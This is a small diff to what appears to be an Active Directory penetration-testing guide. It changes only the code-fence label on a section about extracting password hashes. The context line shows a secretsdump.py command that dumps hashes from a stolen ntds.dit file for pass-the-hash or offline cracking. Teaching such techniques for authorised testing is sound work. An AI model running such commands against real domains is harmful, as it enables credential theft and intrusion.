@@ -179,7 +179,7 @@ Credential Roaming
 ### Extracting Hashes Using SecretsDump
 We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat to gain further access.
 
-```sh
+```shellsession
 $ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 
 Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
